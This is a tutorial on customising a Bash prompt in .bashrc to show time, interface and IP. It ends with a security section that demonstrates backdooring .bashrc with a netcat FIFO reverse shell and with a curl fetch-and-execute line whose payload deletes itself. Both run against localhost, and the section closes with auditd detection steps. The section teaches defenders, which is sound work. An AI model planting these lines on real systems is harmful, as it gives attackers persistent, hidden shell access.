# bashrc

Working with `.bashrc`.

This draws heavily from the following references:

- <https://www.kali.org/blog/kali-linux-2022-1-release/#shell-prompt-changes>
- <https://www.trustedsec.com/blog/workflow-improvements-for-pentesters/>
- <https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808>

It's essentially replicating what's displayed in the TrustedSec blog post, in a way that looks like the Kali `zsh`. The gist by Calos Polop has examples for more advanced things you can do such as displaying current CPU, RAM and disk usage in the prompt.


## Custom Shell Prompt

Here's an example of what this prompt looks like:

```
┌──(user1@ubuntu)-(20220902.15:04:07)-(ens33:172.30.90.16)-[~/Documents]
└─$ 
```


#### Breaking down what this is doing:

- Display the date, time, network information, and current directory in the shell prompt
- Information has different colors for easier reading
- Keep that information above your command line so it's out of the way while you type
- Match networking devices in the following order: openvpn, wireguard, ethernet, wireless
	* This means if you have an openvpn, wireguard, AND a wireless connection, the openvpn connection will take priority and be displayed
- If you have an interface without an IP, the next interface with a valid IP is displayed instead


#### Breaking down the commands to obtain network information:

1. Look at all IPv4 devices:

```bash
ip -4 a
```

2. Match only, PCRE, quietly, device names starting with a number, colon, space, then `tap` or `tun`, plus letters and numbers up to the second colon:

```bash
grep -oPq "^\d:\s(tap|tun)\w+:"
```

Example match: `2: tun0:`

3. Cut (essentially show) the 2nd result based on the delimiter of ':'

```bash
cut -d ':' -f 2
```

Example match: ` tun0`

4. Replace all spaces "\s" in the result with nothing ""

```bash
sed 's/\s//g'
```

Example: ` tun0` -> `tun0`


#### Additional resources:

- <https://academy.tcm-sec.com/p/linux-101>
- <https://www.antisyphontraining.com/regular-expressions-your-new-lifestyle-w-joff-thyer/>


## Modifying .bashrc

The `.bashrc` entries are below. Add them to an existing `.bashrc` file (this has only been tested on Ubuntu).

In Ubuntu 20.04 you'll want to find the following lines:

```bash
if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt
```

This controls what the prompt looks like. We're only modifying the top `PS1=` entry.

First, add these lines just above the line `if [ "$color_prompt" = yes ]; then` so we can use the `$DEV` and `$IP` variables in our prompt:

```bash
if (ip -4 a | grep -oPq "^\d:\s(tap|tun)\w+:"); then
        DEV="$(ip -4 a | grep -oP "^\d:\s(tap|tun)\w+:" | cut -d ':' -f 2 | sed 's/\s//g')"
elif (ip -4 a | grep -oPq "^\d:\swg\w+:"); then
        DEV="$(ip -4 a | grep -oP "^\d:\swg\w+:" | cut -d ':' -f 2 | sed 's/\s//g')"
elif (ip -4 a | grep -A 2 -oPq "^\d:\se(n|th)\w+:"); then
        DEV="$(ip -4 a | grep -A 2 -oP "^\d:\se(n|th)\w+:" | cut -d ':' -f 2 | sed 's/\s//g')"
elif (ip -4 a | grep -A 2 -oPq "^\d:\swl\w+:"); then
        DEV="$(ip -4 a | grep -A 2 -oP "^\d:\swl\w+:" | cut -d ':' -f 2 | sed 's/\s//g')"
elif (ip -4 a | grep -A 2 -oPq "^\d:\slo:"); then
        DEV="$(ip -4 a | grep -A 2 -oP "^\d:\slo:" | cut -d ':' -f 2 | sed 's/\s//g')"
fi

IP="$(ip -4 a | grep -A 2 -P "$DEV" | grep -oP "inet (?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" | tail -1 | awk '{print $2}')"
```

There's likely a better way to do this but it allows the prompt to update the network information based on all of these conditions, without making the `PS1=` line too long to read. This would all have to go on that one line if we decided not to use the `$DEV` and `$IP` variables.

Next comment out that first `PS1=` line, and add this one below it:

```bash
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;34m\]┌──(\[\033[00m\]\[\033[01;32m\]\u@\h\[\033[00m\]\[\033[01;34m\])-(\[\033[00m\]$(date +%Y%m%d.%T)\[\033[01;34m\])-(\[\033[00m\]$DEV:$IP\[\033[01;34m\])-[\[\033[01;32m\]\w\[\033[00m\]\[\033[01;34m\]]\[\033[00m\]\n\[\033[01;34m\]└─\[\033[00m\]\$ '
```

You can undo these changes by removing or commenting the new `PS1=` line we added, and uncommenting the original, while also removing the networking lines we added from the code block above.

The date / time commands are short enough to be included directly in the `PS1=` line. What this means is your timestamp will be updated every time you press enter in the shell.

Because `$DEV` and `$IP` are variables being executed in the `if; then` block before our `PS1=` line, they only update when you open a new terminal tab or window. Alternatively you can `source ~/.bashrc` to update the prompt immediately. 


## Testing Changes

Test this by disconnecting from your network and running `source ~/.bashrc`. It should show `lo:127.0.0.1` if you don't have any other network devices. Reconnect and run `source ~/.bashrc` again to see the network information update once more.

Test your prompt to make sure it's picking up the other interface types correctly. As you add and remove them, `source ~/.bashrc` to get the new network information:

```bash
# Add test interfaces

sudo ip link add dev wlps10 type dummy
sudo ip address add dev wlps10 172.31.2.40

sudo ip link add dev wg0 type dummy
sudo ip address add dev wg0 192.168.2.1

sudo ip link add dev tun0 type dummy
sudo ip address add dev tun0 10.8.9.2
```

When you're done, remove them:

```bash
sudo ip link del dev wlps10
sudo ip link del dev wg0
sudo ip link del dev tun0
```

## Aliases

It's also worth including some examples for aliases. Use these for sets of commands you execute regularly:

```bash
# custom aliases
alias c='clear'
alias dualshark='wireshark& wireshark&'
```


## bashrc Security

As always, when researching custom `.bashrc`, `.zshrc`, or other shell configurations, *be absolutely sure you've reviewed the code before dropping it into a system*. These files make great targets for reverse connections and code execution, as they function like shell scripts. Anything with write access to these files can backdoor them.

Here are two practical examples you can try using localhost (these are not meant to harm your system, but it's always recommended to do things like this in a test environment such as a VM).


#### EXAMPLE 1

This uses `netcat` to simulate a reverse shell.

On the 'server' or the attacker's machine waiting to receive a connection:
```bash
nv -nvlp 1234 -s 127.0.0.1
```

On the 'client' side, this line is added to the victim machine's .bashrc file:
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -nv 127.0.0.1 1234 > /tmp/f
```

Running `source ~/.bashrc`, you'll notice the listener on the 'attacker' side now has a shell on your system.


#### EXAMPLE 2

To be more realistic we'll use a python webserver to host a payload and `curl` to download it to memory and execute it.

We'll write a payload to delete itself silently after spawning `gnome-calculator`.

First `cd` to `~/Public` and write the following text to a file named `test.sh`:

```bash
#!/bin/bash

gnome-calculator&
rm "$0"
```

Then start our webserver inside `~/Public` using python's built in `http.server` module:

```bash
python3 -m http.server 1234 --bind 127.0.0.1
```

Now on the 'victim' side, add the following line to the bottom of your `~/.bashrc` file:

```bash
curl -s http://127.0.0.1:1234/test.sh > /dev/shm/test.sh; chmod +x /dev/shm/test.sh; /dev/shm/test.sh
```

As soon as you `source ~/.bashrc` or open a new terminal tab / window, `gnome-calculator` will spawn. You'll also notice:

- No trace of `test.sh` in `/dev/shm/`
- Aside from the obvious `gnome-calculator` window, the terminal window has full focus and did not print any errors or messages
- `ps axjf` shows `gnome-calculator` spawned as though you ran it yourself, there's no process tree of `curl` > `/bin/bash` > `gnome-calculator`


#### Detecting bashrc Modification

Hopefully this illustrates how powerful these text files are. It wouldn't make sense to not provide suggestions on how to detect this.

Using `auditd` you can record and find this behavior. Like Sysmon, [you'll need to configure what it records](https://github.com/straysheep-dev/setup-auditd). If you're monitoring use of `curl`:

```bash
sudo ausearch -ts recent -c curl
```

Will show every time `curl` was ran in the last 10 minutes. If you followed along with the example then in your logs you'll find:

```
type=EXECVE msg=audit(<time>:<event-id>): argc=3 a0="curl" a1="-s" a2="http://127.0.0.1:1234/test.sh"
```

Which is a pretty good indicator and starting point for further investigation.

You can do the same with the file `.bashrc` itself:

```bash
sudo ausearch -ts recent -f bashrc
```

This will show all entries related to files named `bashrc`. Here again, following the examples you may find `gedit` or `vi` was used to edit `~/.bashrc`.

Lastly, an IDS like `aide`, `tripwire`, `samhain`, or an endpoint agent like `wazuh` can be configured to monitor these files. If changes are ever reported to your `~/.bashrc` file, be sure to review them.
